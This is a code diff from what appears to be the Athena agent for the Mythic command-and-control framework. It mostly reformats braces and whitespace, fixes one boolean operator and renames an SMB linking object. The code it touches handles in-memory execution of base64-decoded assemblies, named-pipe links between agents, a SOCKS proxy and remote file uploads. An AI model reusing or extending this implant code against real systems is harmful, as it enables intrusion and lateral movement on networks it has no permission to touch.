@@ -45,7 +45,8 @@ namespace Athena.Commands
                             job.taskresult = "";
                             job.hasoutput = true;
 
-                            using (var consoleWriter = new ConsoleWriter()) {
+                            using (var consoleWriter = new ConsoleWriter())
+                            {
                                 var origStdout = Console.Out;
                                 try
                                 {
@@ -57,7 +58,7 @@ namespace Athena.Commands
                                     {
                                         job.hasoutput = true;
                                         AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), ea.arguments);
-                                        
+
                                         //Assembly finished executing.
                                         executeAssemblyTask = "";
                                         job.complete = true;
@@ -94,7 +95,7 @@ namespace Athena.Commands
                         output += "-----------------------------------------------------------------------------------\r\n";
                         foreach (var job in Globals.jobs)
                         {
-                            if (job.Value.started &! job.Value.complete)
+                            if (job.Value.started & !job.Value.complete)
                             {
                                 output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Started");
                             }
@@ -133,7 +134,7 @@ namespace Athena.Commands
                                 {
                                     completeJob(ref job, $"Unable to cancel Task: {job.task.parameters}. Request timed out.", true);
                                 }
-                                
+
                                 //Wait 1s, This will be 30s once all the loops complete.
                                 Thread.Sleep(1000);
                             }
@@ -147,15 +148,15 @@ namespace Athena.Commands
                 case "link":
                     {
                         Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                        if(par.ContainsKey("hostname") && par.ContainsKey("pipename"))
+                        if (par.ContainsKey("hostname") && par.ContainsKey("pipename"))
                         {
-                            if(Globals.mc.MythicConfig.smbConfig.Link(par["hostname"], par["pipename"]))
+                            if (Globals.mc.MythicConfig.smbForwarder.Link(par["hostname"], par["pipename"]))
                             {
                                 completeJob(ref job, "Link established.", false);
                             }
                             else
                             {
-                                if (Globals.mc.MythicConfig.smbConfig.connected)
+                                if (Globals.mc.MythicConfig.smbForwarder.connected)
                                 {
                                     completeJob(ref job, "A connection has already been established with an Athena agent.", true);
                                 }
@@ -169,7 +170,7 @@ namespace Athena.Commands
                         {
                             completeJob(ref job, "Invalid command line parameters.", true);
                         }
-                        
+
                     }
                     break;
                 case "load":
@@ -242,7 +243,7 @@ namespace Athena.Commands
                     break;
                 case "socks":
                     var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-                    if (socksInfo["action"].ToString() =="start")
+                    if (socksInfo["action"].ToString() == "start")
                     {
                         if (Globals.socksHandler == null)
                         {
@@ -292,7 +293,8 @@ namespace Athena.Commands
                     {
                         try
                         {
-                            if (!Globals.uploadJobs.ContainsKey(job.task.id)){
+                            if (!Globals.uploadJobs.ContainsKey(job.task.id))
+                            {
                                 MythicUploadJob uj = new MythicUploadJob(job);
                                 Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
                                 uj.path = par["remote_path"];
@@ -302,7 +304,7 @@ namespace Athena.Commands
                                 job.started = true;
                                 job.hasoutput = true;
                                 job.taskresult = "";
-                                
+
                                 //Add job to job tracking Dictionary
                                 Globals.uploadJobs.Add(uj.task.id, uj);
                             }
